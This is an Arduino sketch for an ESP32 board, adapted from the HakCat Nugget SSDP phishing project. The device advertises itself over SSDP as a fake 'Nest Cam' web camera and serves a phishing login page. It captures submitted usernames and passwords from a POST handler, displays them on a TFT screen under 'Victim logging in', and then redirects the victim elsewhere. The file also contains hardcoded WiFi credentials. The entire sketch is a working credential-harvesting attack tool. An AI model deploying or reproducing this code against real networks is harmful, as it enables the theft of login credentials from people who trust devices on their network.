/* WiFi Nugget SSDP Phishing, 2022
 * https://github.com/HakCat-Tech/Nugget-SSDP
 *  
 * by Alex Lynd & HakCat Hardware
 * https://hakcat.com

Modified to work on the Adafruit ESP32-S2 Feather TFT - Ben Dash

 */

// include libraries
#include <ESPAsyncWebServer.h>
#include "ESP32SSDP.h"
#include "webserver.h"
#include "graphics.h"
#include <Adafruit_GFX.h>
#include <Adafruit_ST7789.h>

Adafruit_ST7789 tft = Adafruit_ST7789(TFT_CS, TFT_DC, TFT_RST);

// WiFi credentials
const char* ssid = "INDIGO";
const char* password = "redsun1234";

// start webserver
AsyncWebServer webserver(80);
extern String index_html;
String hostname = "Nest Cam";

void setup() {
  // turn on backlite
  pinMode(TFT_BACKLITE, OUTPUT);
  digitalWrite(TFT_BACKLITE, HIGH);

    // turn on the TFT / I2C power supply
  pinMode(TFT_I2C_POWER, OUTPUT);
  digitalWrite(TFT_I2C_POWER, HIGH);
  delay(10);

  tft.init(135, 240); // Init ST7789 240x135
  tft.setRotation(3);
  tft.fillScreen(ST77XX_BLACK);
  tft.setTextSize(2);

  int x = 1;
  int y = 1;
  int width = 239;
  int height = 134;
  int radius = 10;
  tft.drawRoundRect(x, y, width, height, radius, ST77XX_BLUE);

    tft.println();
    tft.println("  Phishing status: ");
   
    
    // start WiFi!
    tft.println();
    tft.print("  IP");

    WiFi.mode(WIFI_STA);
    WiFi.begin(ssid, password);
    while(WiFi.status() != WL_CONNECTED) {
    delay(500);
    tft.print(".");
  }
    tft.println(WiFi.localIP());

    // set custom hostname and start webserver links
    WiFi.setHostname(hostname.c_str());
    if(WiFi.waitForConnectResult() == WL_CONNECTED) {

        tft.printf("  Starting HTTP...\n");
        
        /********** Phishing page **********/
        webserver.on("/index.html", HTTP_GET, [&](AsyncWebServerRequest *request) {
    
        request->send(200, "text/html", index_html);
          
        tft.fillScreen(ST77XX_BLACK);
        tft.setCursor(0, 0);
        int x = 1;
        int y = 1;
        int width = 239;
        int height = 134;
        int radius = 10;
        tft.drawRoundRect(x, y, width, height, radius, ST77XX_RED);
        tft.println();
        tft.setTextColor(ST77XX_RED);
        tft.println(" Victim logging in:");
        });

        /********** Redirect Page **********/
        webserver.on("/login.php", HTTP_POST, [&](AsyncWebServerRequest *request) {

        String username = request->getParam("username", true)->value() ;
        String password = request->getParam("password", true)->value() ;
       
        tft.setTextColor(ST77XX_GREEN);
        tft.println();
        //tft.println("  Creds found!");
        //tft.println("User:"+username);
        //tft.println("Pass:"+password);
        
        //tft.println("USER CREDENTIALS:");
        tft.print("  Username: "); tft.println(username);
        tft.print("  Password: "); tft.println(password);
        
        request->redirect("https://en.wikipedia.org/wiki/Simple_Service_Discovery_Protocol");
        });
        
        /********** SSDP Description **********/
        webserver.on("/description.xml", HTTP_GET, [&](AsyncWebServerRequest *request) {
            request->send(200, "text/xml", SSDP.schema(false));
        });
        
        webserver.on("/", HTTP_GET, [&](AsyncWebServerRequest *request) {
            request->redirect("/index.html");
        });
        webserver.begin();

        //set schema xml url, nees to match http handler
        //"ssdp/schema.xml" if not set
        SSDP.setSchemaURL("description.xml");
        //set port
        //80 if not set
        SSDP.setHTTPPort(80);
        //set device name
        //Null string if not set
        SSDP.setName("HD Web Cam");
        //set Serial Number
        //Null string if not set
        SSDP.setSerialNumber("001788102201");
        //set device url
        //Null string if not set
        SSDP.setURL("index.html");
        //set model name
        //Null string if not set
        SSDP.setModelName("1080P HD v2.1-N");
        //set model description
        //Null string if not set
        SSDP.setModelDescription("2nd gen - wifi - night vision");
        //set model number
        //Null string if not set
        SSDP.setModelNumber("929000226503");
        //set model url
        //Null string if not set
        SSDP.setModelURL("http://img.funnytab.net/gallery/google/Google_Logo_Poogle.jpg");
        //set model manufacturer name
        //Null string if not set
        SSDP.setManufacturer("PEST Labs/Poogle HW Div.");
        //set model manufacturer url
        //Null string if not set
        SSDP.setManufacturerURL("http://www.pest.com");
        //set device type
        //"urn:schemas-upnp-org:device:Basic:1" if not set
        SSDP.setDeviceType("rootdevice"); //to appear as root device, other examples: MediaRenderer, MediaServer ...
        //set server name
        //"Arduino/1.0" if not set
        SSDP.setServerName("SSDPServer/1.0");
        //set UUID, you can use https://www.uuidgenerator.net/
        //use 38323636-4558-4dda-9188-cda0e6 + 4 last bytes of mac address if not set
        //use SSDP.setUUID("daa26fa3-d2d4-4072-bc7a-a1b88ab4234a", false); for full UUID
        //SSDP.setUUID("daa26fa3-d2d4-4072-bc7a");
        SSDP.setUUID("e35c0659-fdc6-490f-ac75-5a10b0533704", false);
        //Set icons list, NB: optional, this is ignored under windows
        SSDP.setIcons(  "<icon>"
                        "<mimetype>image/png</mimetype>"
                        "<height>48</height>"
                        "<width>48</width>"
                        "<depth>24</depth>"
                        "<url>icon48.png</url>"
                        "</icon>");
        //Set service list, NB: optional for simple device
        SSDP.setServices(  "<service>"
                            "<serviceType>urn:schemas-upnp-org:service:NestDirectory:1</serviceType>"                            
                           //"<serviceType>urn:schemas-upnp-org:service:ContentDirectory:1</serviceType>"
                           //"<serviceType>urn:schemas-upnp-org:service:AVTransport:1</serviceType>"
                           //"<serviceType>urn:schemas-upnp-org:service:ConnectionManager:1</serviceType>"
                           //"<serviceType>urn:schemas-upnp-org:service:RenderingControl:1</serviceType>"
                           //"<serviceId>urn:upnp-org:serviceId:SwitchPower:1</serviceId>"
                           //"<SCPDURL>/SwitchPower1.xml</SCPDURL>"
                           //"<controlURL>/SwitchPower/Control</controlURL>"
                           //"<eventSubURL>/SwitchPower/Event</eventSubURL>"
                           "</service>");

        tft.printf("  Starting SSDP...\n");
        SSDP.begin();

        tft.printf("  Ready!\n");
    } else {
        tft.printf("WiFi Failed\n");
        while(1) {
            delay(100);
        }
    }
}

void loop() {
    delay(1);
}
